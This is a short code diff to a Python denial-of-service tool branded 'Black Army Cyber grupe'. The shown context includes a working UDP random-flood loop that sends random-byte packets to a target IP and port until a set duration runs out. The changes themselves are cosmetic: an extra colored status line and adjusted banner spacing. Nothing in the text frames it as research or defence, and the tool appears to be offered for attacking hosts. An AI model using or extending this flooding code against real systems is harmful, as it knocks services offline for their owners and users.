@@ -58,6 +58,7 @@ def udp_random_flood(ip, port, duration, packet_size):
         while time.time() < end_time:
             time.sleep(0.2)
             print("\033[100m \033[44mStarting UDP Random flood on \033[0m \033[32m" +str(ip)+ " \033[33m0k..!\033[0m")
+            print("\033[94m Starting UDP Plain flood on \033[97m" +str(packet_size)+ " \033[38;5;5mm0k...!\033[0m")
             payload = random.randbytes(packet_size)  # Random payload
             sock.sendto(payload, (ip, port))
             packet_count += 1
@@ -180,8 +181,8 @@ def validate_input(prompt, min_val, max_val, input_type=int):
 def main():
     # Print header when tool runs
     print(f"{Fore.LIGHTRED_EX}╔{'═' * 55}╗")
-    print(f"{Fore.LIGHTRED_EX}║\033[48;5;1m\033[97m  v2.0{' ' * 49}{Fore.LIGHTRED_EX}║\033[0m")
-    print(f"{Fore.LIGHTRED_EX}║\033[48;5;1m\033[97m  Black Army Cyber grupe{' ' * 31}{Fore.LIGHTRED_EX}║\033[0m")
+    print(f"{Fore.LIGHTRED_EX}║\033[48;5;1m\033[97m  v2.0{' ' * 48}{Fore.LIGHTRED_EX}║\033[0m")
+    print(f"{Fore.LIGHTRED_EX}║\033[48;5;1m\033[97m  Black Army Cyber grupe{' ' * 30}{Fore.LIGHTRED_EX}║\033[0m")
     print(f"{Fore.LIGHTRED_EX}╚{'═' * 55}╝")
     
     print("Protocols:")
